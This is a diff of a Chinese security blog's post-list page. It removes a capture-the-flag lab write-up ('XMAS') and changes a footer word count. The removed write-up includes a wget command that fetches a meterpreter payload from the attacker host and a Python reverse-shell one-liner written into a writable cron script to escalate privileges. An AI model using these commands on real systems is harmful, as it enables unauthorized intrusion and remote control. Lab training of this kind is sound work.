@@ -181,105 +181,6 @@ function checkNightMode() {
   <div class="posts">
     
     <div class="post on-list">
-      <h1 class="post-title"><a href="https://l1uyun.one/posts/hmm_xmas/">XMAS</a></h1>
-      <div class="post-meta">
-        
-          <span class="post-date">
-            2024-02-14
-          </span>
-        
-
-        
-        <span class="">
-          
-            #<a href="https://l1uyun.one/tags/sec/">sec</a>&nbsp;
-          
-        </span>
-        
-      </div>
-
-      
-
-      <div class="post-content">
-        <h2 id="靶机-启动">靶机, 启动</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.10.16
-</span></span></code></pre></div><h2 id="端口扫描">端口扫描</h2>
-<p>
-<figure class="md-figure">
-  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_1.png" alt="HMM_XMAS_image_1" /><figcaption>HMM_XMAS_image_1</figcaption></figure>
-
-
-</p>
-<p>
-<figure class="md-figure">
-  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_2.png" alt="HMM_XMAS_image_2" /><figcaption>HMM_XMAS_image_2</figcaption></figure>
-
-
-</p>
-<h2 id="web-服务">web 服务</h2>
-<p>目录扫描</p>
-<p>
-<figure class="md-figure">
-  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_3.png" alt="HMM_XMAS_image_3" /><figcaption>HMM_XMAS_image_3</figcaption></figure>
-
-
-</p>
-<p>在主页的下面发现了一个上传点, 直接上传反弹 shell</p>
-<p>
-<figure class="md-figure">
-  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_4.png" alt="HMM_XMAS_image_4" /><figcaption>HMM_XMAS_image_4</figcaption></figure>
-
-
-</p>
-<p>使用 nc 失败, 换成了 webshell</p>
-<p>
-<figure class="md-figure">
-  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_5.png" alt="HMM_XMAS_image_5" /><figcaption>HMM_XMAS_image_5</figcaption></figure>
-
-
-</p>
-<p>
-<figure class="md-figure">
-  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_6.png" alt="HMM_XMAS_image_6" /><figcaption>HMM_XMAS_image_6</figcaption></figure>
-
-
-
-然后还是用了 meterpreter</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://192.168.10.11:8000/shell.elf -O /tmp/shell.elf<span style="color:#f92672">&amp;&amp;</span>chmod <span style="color:#ae81ff">777</span> /tmp/shell.elf
-</span></span></code></pre></div><h2 id="www-data-进一步收集信息">www-data ,进一步收集信息</h2>
-<p>/home/alabaster/nice_list. txt</p>
-<p>
-<figure class="md-figure">
-  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_7.png" alt="HMM_XMAS_image_7" /><figcaption>HMM_XMAS_image_7</figcaption></figure>
-
-
-</p>
-<p>这有个 python 代码,. 在 linpeas. sh 枚举之后发现是定时任务, 并且是可写的</p>
-<p>
-<figure class="md-figure">
-  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_8.png" alt="HMM_XMAS_image_8" /><figcaption>HMM_XMAS_image_8</figcaption></figure>
-
-
-</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.10.11&#34;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;bash&#34;)&#39;</span> &gt; nice_or_naughty.py
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;import subprocess; subprocess.call([&#34;/tmp/newshell.elf&#34;])&#39;</span> &gt; nice_or_naughty.py
-</span></span></code></pre></div><p>又是这样子不稳定的 shell</p>
-<p>
-<figure class="md-figure">
-  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_XMAS_image_9.png" alt="HMM_XMAS_image_9" /><figcaption>HMM_XMAS_image_9</figcaption></figure>
-
-
-</p>
-<p>上传一个 socat 二进制文件上去算了</p>
-      </div>
-      
-        <div><a class="read-more button" href="/posts/hmm_xmas/">Read more →</a></div>
-      
-    </div>
-    
-    <div class="post on-list">
       <h1 class="post-title"><a href="https://l1uyun.one/posts/hmm_vivifytech/">vivifytech</a></h1>
       <div class="post-meta">
         
@@ -1054,8 +955,6 @@ freddie</p>
 
     
 
-    
-
 
 
 
@@ -1066,7 +965,7 @@ freddie</p>
 <footer class="footer">
   <div class="footer__inner">
     <div class="copyright copyright-font">
-      <span>共 124145 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
+      <span>共 117191 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
     </div>
       
     
